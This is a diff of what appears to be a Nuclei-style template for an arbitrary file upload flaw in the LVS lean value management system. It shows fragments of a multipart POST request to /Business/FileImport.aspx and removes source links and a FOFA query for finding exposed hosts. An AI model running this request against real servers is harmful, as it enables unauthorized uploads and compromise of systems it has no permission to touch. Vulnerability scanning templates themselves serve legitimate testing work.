@@ -3,12 +3,8 @@ info:
   name: LVS精益价值管理系统CGMaterialBaseImport存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sglpu353zqf7l65c'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sglpu353zqf7l65c
-    fofa: body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"
 http:
 - raw:
   - 'POST /Business/FileImport.aspx HTTP/1.1
@@ -45,7 +41,6 @@ http:
     Content-Disposition: form-data; name="TimeStamps"
 
 
-
     ------WebKitFormBoundary3yAQlBeBktTvYBYI
 
     Content-Disposition: form-data; name="PKID"
@@ -63,7 +58,6 @@ http:
     ------WebKitFormBoundary3yAQlBeBktTvYBYI
 
     Content-Disposition: form-data; name="DETAILKEYIDS"
-
 
 
     ------WebKitFormBoundary3yAQlBeBktTvYBYI
@@ -97,7 +91,6 @@ http:
     ------WebKitFormBoundary3yAQlBeBktTvYBYI
 
     Content-Disposition: form-data; name="__DATA_CONDITION__"
-
 
 
     ------WebKitFormBoundary3yAQlBeBktTvYBYI
@@ -192,7 +185,6 @@ http:
 
     ------WebKitFormBoundary3yAQlBeBktTvYBYI--
 
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1776000757323-5bc5c182-981e-4fc6-bcc2-5080d99736d4.png)
 
     访问返回的地址'
   redirects: false
